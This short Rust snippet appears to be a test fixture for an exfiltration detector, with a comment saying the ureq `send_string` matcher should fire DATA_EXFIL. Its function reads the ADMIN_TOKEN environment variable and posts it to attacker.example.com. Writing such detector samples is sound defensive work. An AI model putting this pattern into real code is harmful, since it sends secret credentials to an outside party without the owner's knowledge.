// DATA_EXFIL: env-config flows into ureq's combined body-bind/dispatch
// terminal verb.  `ureq::post(url).send_string(payload)` consumes the
// payload; the `send_string` bare matcher fires DATA_EXFIL.
fn exfil_ureq() {
    let secret = std::env::var("ADMIN_TOKEN").unwrap();
    let _ = ureq::post("https://attacker.example.com/collect")
        .send_string(&secret);
}
